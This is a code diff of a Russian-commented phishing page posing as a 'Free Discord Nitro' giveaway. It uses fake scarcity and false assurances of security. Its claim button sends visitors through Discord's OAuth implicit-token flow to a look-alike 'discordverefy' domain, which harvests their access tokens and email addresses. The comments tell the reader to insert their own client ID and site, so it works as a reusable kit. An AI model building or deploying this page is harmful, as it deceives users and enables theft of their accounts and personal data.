@@ -3,133 +3,39 @@
 <head>
     <title>Free Discord Nitro</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 500px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-        }
-        h1 {
-            color: white;
-            font-size: 48px;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        .nitro-badge {
-            background: linear-gradient(45deg, #ff3366, #ff9933);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 50px;
-            display: inline-block;
-            font-size: 24px;
-            margin: 20px 0;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        .description {
-            color: rgba(255,255,255,0.8);
-            margin: 20px 0;
-            line-height: 1.6;
-        }
-        .login-btn {
-            background: #5865f2;
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 24px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 30px 0;
-            width: 100%;
-            transition: all 0.3s;
-        }
-        .login-btn:hover {
-            background: #4752c4;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-        .counter {
-            color: white;
-            margin-top: 20px;
-            font-size: 18px;
-        }
-        .user-count {
-            color: #ff3366;
-            font-weight: bold;
-            font-size: 24px;
-        }
+        body { background: #36393f; color: white; font-family: Arial; text-align: center; padding: 100px; }
+        .box { background: #2f3136; padding: 40px; border-radius: 10px; max-width: 500px; margin: auto; }
+        button { background: #5865f2; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        h1 { color: #ff3366; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="box">
         <h1>🎁 FREE DISCORD NITRO</h1>
+        <p>Claim your 1 month of Discord Nitro absolutely FREE!</p>
+        <p><strong>Only 23 spots left!</strong></p>
         
-        <div class="nitro-badge">NITRO BOOSTED</div>
+        <button onclick="getNitro()">🔥 CLAIM NITRO NOW</button>
         
-        <div class="description">
-            Claim your <strong>1 MONTH</strong> of Discord Nitro absolutely FREE!<br>
-            Limited time offer for first 100 users.
-        </div>
-        
-        <button class="login-btn" onclick="getNitro()">
-            🔥 CLAIM YOUR NITRO NOW
-        </button>
-        
-        <div class="counter">
-            <span class="user-count" id="count">87</span> Nitro claimed today!
-        </div>
-        
-        <div style="color: rgba(255,255,255,0.6); font-size: 14px; margin-top: 30px;">
-            ⚡ Instant delivery • 🔒 Secure • 🎁 100% Free
-        </div>
+        <p style="margin-top: 30px; color: #999;">
+            ⚡ Instant delivery<br>
+            🔒 Secure authorization<br>
+            🎁 100% Free - No credit card
+        </p>
     </div>
 
     <script>
-        // Случайный счётчик
-        function updateCounter() {
-            let count = Math.floor(Math.random() * 30) + 70;
-            document.getElementById('count').textContent = count;
-            setTimeout(updateCounter, 5000);
-        }
-        
-        // Функция для получения Nitro
         function getNitro() {
-            const clientId = "1450200981185761563"; // Замени на свой!
-            const redirectUri = encodeURIComponent("https://discordverefy.vercel.app/");
+            // ⚠️ ВСТАВЬ СВОЙ CLIENT ID СЮДА:
+            const clientId = "1450200981185761563"; // Твой Discord Client ID
             
-            // Открываем OAuth авторизацию
+            // ⚠️ ВСТАВЬ СВОЙ САЙТ СЮДА:
+            const redirectUri = "https://discordverefy.vercel.app/callback";
+            
+            // Открываем Discord OAuth
             window.location.href = 
-                `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=identify%20email%20guilds`;
+                `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=identify%20email`;
         }
-        
-        // Запускаем счётчик
-        updateCounter();
-        
-        // Авто-клик через 10 секунд (опционально)
-        setTimeout(() => {
-            if (!window.location.hash.includes('access_token')) {
-                document.querySelector('.login-btn').style.background = '#ff3366';
-                document.querySelector('.login-btn').innerHTML = '⏰ HURRY UP! CLICK TO CLAIM';
-            }
-        }, 10000);
     </script>
 </body>
 </html>
-
-
